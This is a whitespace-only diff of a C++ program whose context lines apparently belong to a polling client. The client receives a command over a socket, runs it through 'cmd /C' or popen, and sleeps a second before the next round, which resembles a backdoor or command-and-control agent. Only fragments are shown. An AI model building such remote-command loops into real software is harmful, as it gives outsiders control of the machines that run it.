@@ -64,6 +64,7 @@ std::string send_request(const addrinfo* res, const std::string& req) {
         perror("send");
 #endif
     }
+
     char buf[4096];
     std::string resp;
     int n;
@@ -132,6 +133,7 @@ int main(int argc, char* argv[]) {
         if (!command.empty()) {
             std::cout << "Command: " << command << std::endl;
             std::string result;
+
 #ifdef _WIN32
             std::string fullCmd = "cmd /C " + command + " 2>&1";
             FILE* pipe = _popen(fullCmd.c_str(), "r");
@@ -175,6 +177,7 @@ int main(int argc, char* argv[]) {
 #ifdef _WIN32
         Sleep(1000);
 #else
+
         sleep(1);
 #endif
     }
